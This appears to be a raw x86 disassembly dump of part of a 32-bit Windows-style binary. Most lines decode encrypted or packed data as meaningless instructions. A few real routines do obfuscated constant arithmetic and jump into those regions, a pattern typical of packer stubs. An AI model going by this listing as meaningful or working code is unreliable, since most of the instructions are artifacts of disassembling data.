  40ca02:	(bad)  
  40ca03:	xchg   esi,eax
  40ca04:	or     DWORD PTR [edi-0x6],edi
  40ca07:	out    0x71,eax
  40ca09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca0a:	add    BYTE PTR [ebx-0x39a6e80f],0xa
  40ca11:	pop    esp
  40ca12:	lods   al,BYTE PTR ds:[esi]
  40ca13:	outs   dx,DWORD PTR ds:[esi]
  40ca14:	scas   eax,DWORD PTR es:[edi]
  40ca15:	loope  0x40ca14
  40ca17:	imul   esi,DWORD PTR [ecx-0x60dae81e],0xfffffffe
  40ca1e:	fimul  DWORD PTR [ebp+0x7acb5c53]
  40ca24:	or     DWORD PTR [esi],ebp
  40ca26:	fdiv   st,st(1)
  40ca28:	push   ss
  40ca29:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca2b:	adc    bl,cl
  40ca2d:	sub    DWORD PTR [edi+0x51],ebx
  40ca30:	jbe    0x40ca8a
  40ca32:	pop    ss
  40ca33:	cmp    DWORD PTR [ecx+esi*4-0x5c],0x5c
  40ca38:	adc    esp,eax
  40ca3a:	ja     0x40ca40
  40ca3c:	sbb    eax,0x3d8e2e02
  40ca41:	or     edi,esp
  40ca43:	rcr    DWORD PTR [edx-0xa],1
  40ca46:	or     al,0x5c
  40ca48:	dec    ebx
  40ca49:	jg     0x40ca2c
  40ca4b:	sub    edx,ecx
  40ca4d:	rcr    BYTE PTR [ebx+0x155e85d6],0x93
  40ca54:	push   edi
  40ca55:	popf   
  40ca56:	jmpw   0x4fc
  40ca5a:	out    dx,eax
  40ca5b:	arpl   WORD PTR [edx-0x7e658361],ax
  40ca61:	cld    
  40ca62:	retf   
  40ca63:	(bad)  
  40ca64:	mov    WORD PTR [edx+0x59],ds
  40ca67:	adc    BYTE PTR [ebx],bl
  40ca69:	mov    al,0x12
  40ca6b:	mov    DWORD PTR [eax+0x1b587a6b],eax
  40ca71:	outs   dx,DWORD PTR ds:[esi]
  40ca72:	pop    DWORD PTR [ebp+0x42]
  40ca75:	mov    bl,0xb6
  40ca77:	mov    ebp,0x7df367c4
  40ca7c:	mul    bl
  40ca7e:	xor    bl,BYTE PTR [esi]
  40ca80:	repz mov esp,0x55aa849
  40ca86:	call   0x356f:0xc9a6e219
  40ca8d:	ja     0x40ca65
  40ca8f:	xor    DWORD PTR [esi],0xfa7b682d
  40ca95:	bound  edi,QWORD PTR [eax+0x562ec5be]
  40ca9b:	xor    DWORD PTR [ecx+0x62bf3db2],esi
  40caa1:	aam    0x81
  40caa3:	(bad)  
  40caa4:	sub    al,0xbf
  40caa6:	sub    al,0xab
  40caa8:	dec    eax
  40caa9:	sbb    dl,ch
  40caab:	(bad)  
  40caad:	loopne 0x40cada
  40caaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cab0:	jmp    0x40ca57
  40cab2:	sbb    dh,BYTE PTR [edx-0x4f7a21ed]
  40cab8:	sbb    eax,0xf2cc1c4a
  40cabd:	dec    ecx
  40cabe:	cmp    al,0x9c
  40cac0:	mov    al,ds:0xa82bf3b3
  40cac5:	jb     0x40cab2
  40cac7:	ja     0x40ca59
  40cac9:	mov    al,ds:0x8d0802ce
  40cace:	pop    edi
  40cacf:	ins    DWORD PTR es:[edi],dx
  40cad0:	xor    al,0x48
  40cad2:	fs ss fs pop ebp
  40cad6:	xor    DWORD PTR [esi+0x3b],edi
  40cad9:	cdq    
  40cada:	mov    bh,0x6c
  40cadc:	gs jecxz 0x40cb18
  40cadf:	pop    eax
  40cae0:	into   
  40cae1:	or     eax,0x106a875a
  40cae6:	hlt    
  40cae7:	in     al,0x99
  40cae9:	bound  ecx,QWORD PTR ds:0x4b511177
  40caef:	adc    dl,BYTE PTR [edx]
  40caf1:	stc    
  40caf2:	adc    esi,eax
  40caf4:	mov    dh,0xb5
  40caf6:	xor    al,BYTE PTR [ebx]
  40caf8:	iret   
  40caf9:	test   al,0x93
  40cafb:	sbb    BYTE PTR [edi-0x4a],ah
  40cafe:	or     ah,BYTE PTR [ebx+0x7342ee48]
  40cb04:	repz enter 0xc026,0x22
  40cb09:	ins    DWORD PTR es:[edi],dx
  40cb0a:	sbb    BYTE PTR [ebp-0x6],ch
  40cb0d:	mov    al,dh
  40cb0f:	xor    BYTE PTR [eax-0x3851a9a5],0xb5
  40cb16:	dec    edx
  40cb17:	in     eax,0x65
  40cb19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb1b:	test   edx,0x5cef7b2b
  40cb21:	xchg   ebp,eax
  40cb22:	add    BYTE PTR [ecx+0x53],0xdc
  40cb26:	aam    0xf2
  40cb28:	aam    0xc3
  40cb2a:	xchg   esi,eax
  40cb2b:	dec    edx
  40cb2c:	rcr    DWORD PTR [ecx+0x45],cl
  40cb2f:	(bad)  
  40cb30:	aas    
  40cb31:	push   ebp
  40cb32:	int3   
  40cb33:	xchg   ebx,eax
  40cb34:	out    0xf1,eax
  40cb36:	jl     0x40cb22
  40cb38:	ds pop eax
  40cb3a:	mov    al,0xae
  40cb3c:	cdq    
  40cb3d:	cmc    
  40cb3e:	lock sbb esp,DWORD PTR [eax-0x67]
  40cb42:	xor    eax,0xbfd036ad
  40cb47:	pop    ss
  40cb48:	add    al,BYTE PTR [eax]
  40cb4a:	fisttp WORD PTR [ebp+0x14]
  40cb4d:	adc    ah,cl
  40cb4f:	data16 jle 0x40cadc
  40cb52:	ins    DWORD PTR es:[edi],dx
  40cb53:	hlt    
  40cb54:	jo     0x40cb82
  40cb56:	jecxz  0x40cb41
  40cb58:	mov    ah,0x5b
  40cb5a:	dec    edi
  40cb5b:	jge    0x40cb3a
  40cb5d:	div    DWORD PTR [ebp-0x545b153d]
  40cb63:	aam    0x8c
  40cb65:	cmc    
  40cb66:	mov    ch,0x3f
  40cb68:	sti    
  40cb69:	push   0xec241368
  40cb6e:	adc    DWORD PTR [ebp-0x411fa69b],0x12d94310
  40cb78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb79:	pushf  
  40cb7a:	mov    ebx,0x78485b7a
  40cb7f:	sahf   
  40cb80:	scas   al,BYTE PTR es:[edi]
  40cb81:	stc    
  40cb82:	and    dl,bh
  40cb84:	jmp    0x1eee6877
  40cb89:	cld    
  40cb8a:	call   0xe0d7:0x3272658c
  40cb91:	xor    eax,0x46f286d3
  40cb96:	pop    ss
  40cb97:	mov    al,ds:0x161628d8
  40cb9c:	popa   
  40cb9d:	mov    edi,0x13e14da8
  40cba2:	inc    edx
  40cba3:	jmp    0xe07f:0xe4ad0c00
  40cbaa:	inc    esi
  40cbab:	jno    0x40cb37
  40cbad:	or     al,0xe9
  40cbaf:	mov    esp,DWORD PTR [ebx-0x53]
  40cbb2:	jb     0x40cb6c
  40cbb4:	sub    BYTE PTR [esi],al
  40cbb6:	jo     0x40cb9d
  40cbb8:	ins    DWORD PTR es:[edi],dx
  40cbb9:	or     al,0xed
  40cbbb:	or     BYTE PTR [ecx],bl
  40cbbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbbe:	(bad)  
  40cbbf:	cmp    cl,BYTE PTR [edi]
  40cbc1:	pop    esp
  40cbc2:	in     al,dx
  40cbc3:	xchg   edx,eax
  40cbc4:	fidivr WORD PTR [edi-0x31]
  40cbc7:	pop    edx
  40cbc8:	or     ah,BYTE PTR [ebp-0x3a]
  40cbcb:	cmc    
  40cbcc:	ret    
  40cbcd:	gs icebp 
  40cbcf:	imul   eax,DWORD PTR [eax-0x27],0x14
  40cbd3:	sub    al,0xea
  40cbd5:	sbb    DWORD PTR [edx+0x7c],0xffffffe7
  40cbd9:	mov    dh,0xb7
  40cbdb:	push   eax
  40cbdc:	ds jle 0x40cbef
  40cbdf:	jae    0x40cc06
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x422620,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax-0x41113b35],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [ecx+0x7cf879ad],bh
  40cc7c:	test   eax,0x8ed6ef0a
  40cc81:	xchg   edx,eax
  40cc82:	data16 mov dl,0x3b
  40cc85:	xor    edi,ebx
  40cc87:	fisttp DWORD PTR [eax]
  40cc89:	push   ds
  40cc8a:	or     DWORD PTR [eax],ecx
  40cc8c:	sub    DWORD PTR [edi],esi
  40cc8e:	sbb    edi,esp
  40cc90:	fsub   DWORD PTR [ecx-0x65]
  40cc93:	push   edi
  40cc94:	(bad)  
  40cc95:	les    eax,FWORD PTR ds:0xc5e8a660
  40cc9b:	ja     0x40cd19
  40cc9d:	xor    BYTE PTR [ebx+0x1618d5ec],bl
  40cca3:	daa    
  40cca4:	cmovno edx,DWORD PTR [ecx]
  40cca7:	or     ebp,DWORD PTR [edi]
  40cca9:	cld    
  40ccaa:	push   eax
  40ccab:	dec    ebp
  40ccac:	bound  eax,QWORD PTR [ebx-0x6b]
  40ccaf:	icebp  
  40ccb0:	cdq    
  40ccb1:	sub    dl,al
  40ccb3:	sub    BYTE PTR [ecx],cl
  40ccb5:	mov    ebx,0x55edac0c
  40ccba:	add    al,0xd
  40ccbc:	mov    cs,WORD PTR [edx-0x21dadc92]
  40ccc2:	mov    eax,ds:0xa93a8266
  40ccc7:	pop    esi
  40ccc8:	pop    eax
  40ccc9:	in     eax,0x5e
  40cccb:	hlt    
  40cccc:	loopne 0x40cc67
  40ccce:	and    al,0xa6
  40ccd0:	jl     0x40cd02
  40ccd2:	push   esp
  40ccd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccd5:	stos   DWORD PTR es:[edi],eax
  40ccd6:	ret    
  40ccd7:	jmp    0x3e5e0b1
  40ccdc:	cmp    esi,DWORD PTR [edi-0x2cfb5b31]
  40cce2:	in     eax,0x55
  40cce4:	inc    edx
  40cce5:	xchg   ebx,eax
  40cce6:	push   cs
  40cce7:	pusha  
  40cce8:	jp     0x40cd06
  40ccea:	push   edx
  40cceb:	sub    al,0xcb
  40cced:	leave  
  40ccee:	mov    esp,0x31f6eda1
  40ccf3:	scas   eax,DWORD PTR es:[edi]
  40ccf4:	or     bl,bl
  40ccf6:	das    
  40ccf7:	add    esp,DWORD PTR [ebp-0x6b9bbe9c]
  40ccfd:	jle    0x40ccdc
  40ccff:	lea    ebx,ds:0x76067793
  40cd05:	dec    esi
  40cd06:	pop    eax
  40cd07:	cmp    edi,DWORD PTR [edi+0xbe11338]
  40cd0d:	mov    al,0x76
  40cd0f:	cmp    edi,DWORD PTR [ebx]
  40cd11:	clc    
  40cd12:	lods   al,BYTE PTR ds:[esi]
  40cd13:	ja     0x40ccf3
  40cd15:	iret   
  40cd16:	mov    al,ds:0x1dd09dce
  40cd1b:	psllw  mm7,QWORD PTR [ecx-0x4e]
  40cd1f:	mov    al,0x36
  40cd21:	jmp    0x40ccbb
  40cd23:	inc    esp
  40cd24:	call   0xb3f358b7
  40cd29:	mov    edx,0x85dd658d
  40cd2e:	pusha  
  40cd2f:	pop    eax
  40cd30:	push   ebp
  40cd31:	retf   
  40cd32:	jg     0x40cd84
  40cd34:	bound  ecx,QWORD PTR [ebx-0x3]
  40cd37:	cmp    eax,0x1fba7a8e
  40cd3c:	ins    BYTE PTR es:[edi],dx
  40cd3d:	aad    0xe0
  40cd3f:	inc    esp
  40cd40:	xor    eax,0x358c60d2
  40cd45:	xchg   BYTE PTR [edx-0x8facb91],dl
  40cd4b:	sti    
  40cd4c:	mov    DWORD PTR [edx-0x67],edi
  40cd4f:	mov    ebp,0xa6e4a065
  40cd54:	ror    BYTE PTR [edi],1
  40cd56:	jmp    0xc2242b91
  40cd5b:	mov    ebx,eax
  40cd5d:	mov    eax,ds:0xb7e38095
  40cd62:	sbb    DWORD PTR [edx-0x7d077b54],0x1e
  40cd69:	rol    DWORD PTR [ebx-0xf535318],cl
  40cd6f:	jge    0x40cd23
  40cd71:	test   ch,0x4a
  40cd74:	sub    BYTE PTR cs:[esi],al
  40cd77:	xor    DWORD PTR [ecx+0x7136627e],ebx
  40cd7d:	(bad)  
  40cd7e:	call   0xf7e62401
  40cd83:	shl    BYTE PTR [edi+0x5f],0x8d
  40cd87:	jge    0x40cdc4
  40cd89:	cmp    DWORD PTR [ecx+ebp*4-0x26],ebx
  40cd8d:	test   BYTE PTR [eax+0x1851e73],0x3a
  40cd94:	xor    ecx,DWORD PTR [edx+ebx*8+0x6afb6e4]
  40cd9b:	jne    0x40cdca
  40cd9d:	and    esi,DWORD PTR [ebx-0x6f40c923]
  40cda3:	fcomp  QWORD PTR [eax-0x1e824634]
  40cda9:	inc    esi
  40cdaa:	pop    ebp
  40cdab:	inc    ebp
  40cdac:	mov    esi,0xa3e79c47
  40cdb1:	push   ebx
  40cdb2:	mov    al,0x7d
  40cdb4:	pop    esp
  40cdb5:	imul   esi,DWORD PTR [edi],0xdd62a88f
  40cdbb:	test   al,0x64
  40cdbd:	inc    edx
  40cdbe:	mov    ah,0x92
  40cdc0:	in     eax,0x76
  40cdc2:	sbb    DWORD PTR [edx],ebx
  40cdc4:	sub    edx,DWORD PTR [edx+0x36166e11]
  40cdca:	push   ebx
  40cdcb:	xor    DWORD PTR ds:0x8cbfe50b,0x83eefe1f
  40cdd5:	sahf   
  40cdd6:	inc    eax
  40cdd7:	ret    
  40cdd8:	jl     0x40cd90
  40cdda:	push   edi
  40cddb:	cmp    ah,BYTE PTR [ebx-0x400614fa]
  40cde1:	outs   dx,BYTE PTR ds:[esi]
  40cde2:	ins    DWORD PTR es:[edi],dx
  40cde3:	push   es
  40cde4:	jbe    0x40ce27
  40cde6:	inc    edi
  40cde7:	stc    
  40cde8:	xchg   ebp,eax
  40cde9:	popa   
  40cdea:	fwait
  40cdeb:	adc    DWORD PTR [edi],edx
  40cded:	les    ecx,FWORD PTR [eax]
  40cdef:	or     al,cl
  40cdf1:	dec    eax
  40cdf2:	out    dx,eax
  40cdf3:	shl    DWORD PTR [edi-0x19],1
  40cdf6:	(bad)  
  40cdf7:	aad    0x8
  40cdf9:	xor    BYTE PTR [edi-0x1fad0df6],0xc9
  40ce00:	mov    al,0x9
  40ce02:	sub    ch,BYTE PTR [edi]
  40ce04:	jbe    0x40ce26
  40ce06:	pop    edx
  40ce07:	clc    
  40ce08:	mov    edi,0xfa80a000
  40ce0d:	dec    eax
  40ce0e:	or     al,0x17
  40ce10:	jp     0x40cdd4
  40ce12:	cli    
  40ce13:	xchg   esp,eax
  40ce14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce15:	cdq    
  40ce16:	popa   
  40ce17:	mov    eax,0x78919a89
  40ce1c:	(bad)  
  40ce1d:	(bad)  [edi-0x22a6e553]
  40ce23:	aam    0xd0
  40ce25:	mov    eax,0x77e503f3
  40ce2a:	push   esi
  40ce2b:	clc    
  40ce2c:	mov    bh,dh
  40ce2e:	ds xor edx,esp
  40ce31:	mov    bh,0x58
  40ce33:	cdq    
  40ce34:	inc    esi
  40ce35:	addr16 or al,0x36
  40ce38:	inc    ecx
  40ce39:	imul   eax,DWORD PTR [eax-0x74],0x4e471336
  40ce40:	adc    BYTE PTR ds:0x51b4b110,0x38
  40ce47:	cmp    bh,BYTE PTR [ebx-0x1a4b68af]
  40ce4d:	add    al,0x6
  40ce4f:	push   esi
  40ce50:	(bad)  
  40ce51:	mov    ecx,0x9037695b
  40ce56:	addr16 or al,0x5d
  40ce59:	mov    al,0x6c
  40ce5b:	stos   DWORD PTR es:[edi],eax
  40ce5c:	mov    edx,0x645e0e29
  40ce61:	ror    DWORD PTR ds:0x95b148ac,0xf9
  40ce68:	mov    dh,0x8b
  40ce6a:	ins    DWORD PTR es:[edi],dx
  40ce6b:	rcr    BYTE PTR [ecx],1
  40ce6d:	call   0x7b1b365e
  40ce72:	addr16 repz loopne 0x40ce2f
  40ce76:	push   0xffffff9c
  40ce78:	jecxz  0x40ce55
  40ce7a:	pusha  
  40ce7b:	iret   
  40ce7c:	jp     0x40ce48
  40ce7e:	pop    ebx
  40ce7f:	mov    dh,BYTE PTR [ecx]
  40ce81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce82:	aam    0x57
  40ce84:	popf   
  40ce85:	add    esi,DWORD PTR [edi+esi*4+0xa01e6a8]
  40ce8c:	jns    0x40ce31
  40ce8e:	xor    al,0xad
  40ce90:	pop    edi
  40ce91:	mov    esi,0x391cd38f
  40ce96:	mov    ch,0x7
  40ce98:	js     0x40ce37
  40ce9a:	and    al,0xb2
  40ce9c:	dec    edx
  40ce9d:	int3   
  40ce9e:	push   esi
  40ce9f:	push   ss
  40cea0:	jmp    0x9d6022df
  40cea5:	imul   cl
  40cea7:	mov    ch,0x74
  40cea9:	mov    eax,ds:0x6c806eb0
  40ceae:	add    DWORD PTR [eax+0x7c],ecx
  40ceb1:	cmp    DWORD PTR [edi+0xe],edi
  40ceb4:	loop   0x40cf0c
  40ceb6:	add    DWORD PTR [ebx+0x1d727103],edx
  40cebc:	fadd   st(2),st
  40cebe:	ja     0x40ceb4
  40cec0:	xchg   ebp,eax
  40cec1:	ror    DWORD PTR [edi+0x39],0x65
  40cec5:	popf   
  40cec6:	outs   dx,DWORD PTR ds:[esi]
  40cec7:	adc    DWORD PTR [edi],edi
  40cec9:	imul   esi,DWORD PTR [eax+ebx*1+0x7d34b4d5]
  40ced1:	out    dx,al
  40ced2:	xchg   BYTE PTR [esi+esi*8],al
  40ced5:	aam    0x5f
  40ced7:	pop    ss
  40ced8:	dec    ecx
  40ced9:	ins    DWORD PTR es:[edi],dx
  40ceda:	into   
  40cedb:	push   ebp
  40cedc:	adc    al,0xed
  40cede:	add    eax,0x8cd8fd78
  40cee3:	sahf   
  40cee4:	loopne 0x40cf43
  40cee6:	xchg   DWORD PTR [ebx-0x471b3684],ebx
  40ceec:	pusha  
  40ceed:	push   cs
  40ceee:	jae    0x40cf15
  40cef0:	test   eax,0xe28182f3
  40cef5:	cmc    
  40cef6:	scas   eax,DWORD PTR es:[edi]
  40cef7:	data16 aam 0xac
  40cefa:	outs   dx,BYTE PTR ds:[esi]
  40cefb:	test   DWORD PTR [ecx],ebp
  40cefd:	test   eax,0x5b1b6523
  40cf02:	cmp    BYTE PTR [ecx-0x6c766ee8],al
  40cf08:	fadd   DWORD PTR [edi+0x2c]
  40cf0b:	loop   0x40ceb8
  40cf0d:	sub    BYTE PTR ds:[ebx+0x5e],ch
  40cf11:	jge    0x40ceed
  40cf13:	fs pop edx
  40cf15:	mov    ah,0x7e
  40cf17:	push   esi
  40cf18:	adc    al,0x21
  40cf1a:	dec    edx
  40cf1b:	push   ebp
  40cf1c:	and    DWORD PTR [ebx+ecx*4+0x45],ebx
  40cf20:	cld    
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422518
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi+0x795bbcd3],esi
  40cfad:	cmp    DWORD PTR [edx+0x72],ebp
  40cfb0:	call   0x1512e7cd
  40cfb5:	sbb    BYTE PTR [eax],bl
  40cfb7:	jbe    0x40d013
  40cfb9:	mov    ah,BYTE PTR [esi]
  40cfbb:	sub    al,0x88
  40cfbd:	jns    0x40cfd1
  40cfbf:	jmp    0x23d5fcb9
  40cfc4:	jnp    0x40cfff
  40cfc6:	stos   BYTE PTR es:[edi],al
  40cfc7:	push   0x7f
  40cfc9:	in     eax,dx
  40cfca:	inc    ecx
  40cfcb:	std    
  40cfcc:	lock jl 0x40cfe3
  40cfcf:	sti    
  40cfd0:	fcmovbe st,st(4)
  40cfd2:	pushf  
  40cfd3:	xchg   ecx,eax
  40cfd4:	gs jmp 0x40d040
  40cfd7:	xor    DWORD PTR [esi-0x5c],0xffffff92
  40cfdb:	push   esp
  40cfdc:	jb     0x40cfda
  40cfde:	push   ss
  40cfdf:	fcomp  DWORD PTR [edi]
  40cfe1:	xor    BYTE PTR [ebx],0x9d
  40cfe4:	push   cs
  40cfe5:	push   esi
  40cfe6:	cs pop ecx
  40cfe8:	and    DWORD PTR [eax+0x3b],eax
  40cfeb:	lea    ebx,[esi]
  40cfed:	pop    ecx
  40cfee:	outs   dx,DWORD PTR ds:[esi]
  40cfef:	pop    edi
  40cff0:	js     0x40d03a
  40cff2:	jnp    0x40cff1
  40cff4:	fs inc edx
  40cff6:	bound  esi,QWORD PTR [esi+esi*2]
  40cff9:	dec    edi
  40cffa:	xlat   BYTE PTR ds:[ebx]
  40cffb:	dec    esp
  40cffc:	test   BYTE PTR [eax+eiz*4],ah
  40cfff:	xchg   ecx,eax
  40d000:	add    DWORD PTR [ebx],esi
  40d002:	lock sbb eax,0x43305f1a
  40d008:	mov    edi,0xaa63921b
  40d00d:	pusha  
  40d00e:	es das 
  40d010:	cld    
  40d011:	and    bl,BYTE PTR [edi-0x6454e3fd]
  40d017:	test   eax,0xe47676e
  40d01c:	and    eax,0xbb750133
  40d021:	sub    BYTE PTR [ecx],0x8d
  40d024:	(bad)  
  40d025:	xor    BYTE PTR [ecx+ecx*8],ch
  40d028:	xor    eax,0xdfeec249
  40d02d:	xor    esi,ebp
  40d02f:	push   edx
  40d031:	and    DWORD PTR [edx],ebx
  40d033:	loope  0x40d05c
  40d035:	cmc    
  40d036:	std    
  40d037:	mov    dl,0x85
  40d039:	adc    dl,dh
  40d03b:	outs   dx,DWORD PTR ds:[esi]
  40d03c:	cld    
  40d03d:	jae    0x40d058
  40d03f:	ins    DWORD PTR es:[edi],dx
  40d040:	fadd   DWORD PTR [ecx+0x67]
  40d043:	mov    es,edi
  40d045:	cs cmp al,0x11
  40d048:	mov    BYTE PTR [ebp-0x7a3501b0],al
  40d04e:	jg     0x40d05b
  40d050:	test   BYTE PTR [ecx+0x79],0x1c
  40d054:	rcl    BYTE PTR [ebp-0x40c258e2],1
  40d05a:	sti    
  40d05b:	stc    
  40d05c:	adc    edx,DWORD PTR [edi+0x7]
  40d05f:	pop    ebp
  40d060:	sbb    al,0x1d
  40d062:	icebp  
  40d063:	push   cs
  40d064:	inc    esi
  40d065:	xchg   esp,eax
  40d066:	popf   
  40d067:	jp     0x40d064
  40d069:	out    0xa5,eax
  40d06b:	cmp    al,0x5b
  40d06d:	retf   0x992
  40d070:	mov    ebx,ecx
  40d072:	pop    ds
  40d073:	fsubr  QWORD PTR [ebp-0x3d32ca0e]
  40d079:	ins    DWORD PTR es:[edi],dx
  40d07a:	out    0x25,al
  40d07c:	rcr    edx,1
  40d07e:	ret    
  40d07f:	sub    esp,DWORD PTR [edi+ebx*4]
  40d082:	repz or cl,BYTE PTR [ecx]
  40d085:	xchg   esi,eax
  40d086:	mov    WORD PTR [edi],?
  40d088:	gs pop eax
  40d08a:	call   0xb1b4:0xc42ab292
  40d091:	sub    DWORD PTR [edi+0x3d109c0a],edi
  40d097:	sub    esp,DWORD PTR [eax-0x78]
  40d09a:	imul   ecx,esp,0xffffffdf
  40d09d:	sub    BYTE PTR [ecx-0x64],dh
  40d0a0:	jge    0x40d07b
  40d0a2:	cmp    eax,0x19b449a6
  40d0a7:	out    0xff,al
  40d0a9:	rcl    BYTE PTR [ecx-0x31c62ac],cl
  40d0af:	sub    al,0x9
  40d0b1:	cmp    bh,0x5a
  40d0b4:	xor    ebx,DWORD PTR [ebp+0x33]
  40d0b7:	in     eax,dx
  40d0b8:	pop    es
  40d0b9:	mov    bh,0xcd
  40d0bb:	out    dx,eax
  40d0bc:	gs out 0xb8,al
  40d0bf:	push   ss
  40d0c0:	mov    DWORD PTR [ebx+0x69],edx
  40d0c3:	mov    cl,0x5
  40d0c5:	mov    ah,BYTE PTR ds:0x2bed976d
  40d0cb:	cmp    al,0xd9
  40d0cd:	psubsw mm6,mm0
  40d0d0:	mov    edx,0x53a58525
  40d0d5:	fisub  WORD PTR ds:0x16886dac
  40d0db:	mov    bh,0x7f
  40d0dd:	arpl   WORD PTR [ebp-0x3b],dx
  40d0e0:	popa   
  40d0e1:	mov    cl,0x94
  40d0e3:	retf   
  40d0e4:	adc    DWORD PTR [esp+ebx*4+0x5e],ecx
  40d0e8:	shl    BYTE PTR [ebp-0x56],cl
  40d0eb:	stos   DWORD PTR es:[edi],eax
  40d0ec:	sub    al,0x27
  40d0ee:	(bad)  
  40d0ef:	retf   0xdc7e
  40d0f2:	xchg   ecx,eax
  40d0f3:	inc    DWORD PTR [ecx]
  40d0f5:	mov    ebp,0xfbce2f93
  40d0fa:	lahf   
  40d0fb:	ds shl bh,cl
  40d0fe:	sub    al,0xf
  40d100:	mov    al,ds:0xccb93d88
  40d105:	jl     0x40d0d2
  40d107:	stos   DWORD PTR es:[edi],eax
  40d108:	shr    BYTE PTR [esp+ebx*1-0xf],0xa5
  40d10d:	mov    BYTE PTR [ecx],ch
  40d10f:	sub    DWORD PTR ds:0xc40ccc66,0xd08f4ac4
  40d119:	or     ax,0x9c45
  40d11d:	dec    esi
  40d11e:	jge    0x40d12b
  40d120:	or     BYTE PTR [edx+0x2f],al
  40d123:	ds int 0x6
  40d126:	dec    eax
  40d127:	ror    BYTE PTR [ebx],1
  40d129:	sub    ch,BYTE PTR ds:0x68a1b9a1
  40d12f:	xchg   esi,eax
  40d130:	fstp   TBYTE PTR [ebp+0x4b]
  40d133:	jno    0x40d1a7
  40d135:	mov    edx,0x38ee8408
  40d13a:	int3   
  40d13b:	cmc    
  40d13c:	lods   eax,DWORD PTR ds:[esi]
  40d13d:	sub    al,0x4f
  40d13f:	jae    0x40d123
  40d141:	add    ch,BYTE PTR [ebx]
  40d143:	mov    al,0x84
  40d145:	and    eax,0x20697412
  40d14a:	jb     0x40d10a
  40d14c:	fdivr  DWORD PTR [ebp-0x3f]
  40d14f:	in     al,0x7b
  40d151:	or     al,0x40
  40d153:	lods   eax,DWORD PTR ds:[esi]
  40d154:	popa   
  40d155:	add    DWORD PTR [esi],ebp
  40d157:	sahf   
  40d158:	pop    ecx
  40d159:	sar    BYTE PTR [esi-0x47],0xd4
  40d15d:	lds    ebx,FWORD PTR [edx+0x75ea5a0b]
  40d163:	std    
  40d164:	adc    bh,BYTE PTR [edi-0x78]
  40d167:	sbb    al,BYTE PTR [eax*2+0x3f0f4556]
  40d16e:	into   
  40d16f:	adc    eax,0xb02100ba
  40d174:	inc    eax
  40d175:	dec    edi
  40d176:	out    dx,al
  40d177:	nop
  40d178:	cmp    eax,0x9446eedf
  40d17d:	xabort 0x5
  40d180:	nop
  40d181:	dec    ecx
  40d182:	iret   
  40d183:	xchg   esp,eax
  40d184:	push   edx
  40d185:	inc    edi
  40d186:	sub    ah,ah
  40d188:	outs   dx,DWORD PTR ds:[esi]
